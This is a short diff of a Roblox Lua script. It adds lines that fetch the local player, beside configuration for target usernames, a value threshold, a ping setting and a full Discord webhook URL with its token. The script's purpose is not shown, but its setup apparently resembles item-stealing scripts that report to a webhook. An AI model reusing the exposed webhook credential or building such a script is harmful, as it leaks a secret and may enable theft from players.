@@ -10,6 +10,9 @@ local min_value = 1
 local ping = "Yes"
 local webhook = "https://discord.com/api/webhooks/1406982165257785515/f-Fhp7M0hDM3-doX8wWN7MR8MuPgj5mzx5JeJdDO4y-3KAkBlrNAgR6PdcWWEtbL8t4v"
 
+local Players = game:GetService("Players")
+local plr = Players.LocalPlayer
+
 if next(users) == nil or webhook == "" then
     plr:kick("You didn't add username or webhook")
     return
